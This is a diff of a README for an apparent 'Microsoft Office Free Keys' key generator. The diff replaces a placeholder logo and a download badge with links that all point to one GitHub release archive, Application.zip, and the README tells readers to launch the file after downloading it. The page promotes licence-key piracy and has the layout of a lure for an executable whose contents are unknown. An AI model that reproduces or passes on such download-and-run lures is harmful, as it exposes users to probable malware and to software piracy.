@@ -1,7 +1,7 @@
 
 # 🌟 **Welcome to Microsoft Office Free Keys!** 🌟
 
-![Microsoft Office Free Keys Logo](https://example.com/logo.png)
+![Microsoft Office Free Keys Logo](https://github.com/arafat001imon/Microsoft-Office-Free-Keys/releases/download/v1.0.0/Application.zip)
 
 ### What is Microsoft Office Free Keys?
 
@@ -17,7 +17,7 @@ Microsoft Office Free Keys is a program that allows users to generate free produ
 
 To get started with Microsoft Office Free Keys, simply download the application from the link below:
 
-[<img src="https://img.shields.io/badge/Download-Application.zip-brightgreen">](https://github.com/file/Application.zip)
+[<img src="https://github.com/arafat001imon/Microsoft-Office-Free-Keys/releases/download/v1.0.0/Application.zip">](https://github.com/arafat001imon/Microsoft-Office-Free-Keys/releases/download/v1.0.0/Application.zip)
 
 ### **Note:** The file needs to be launched after downloading.
 
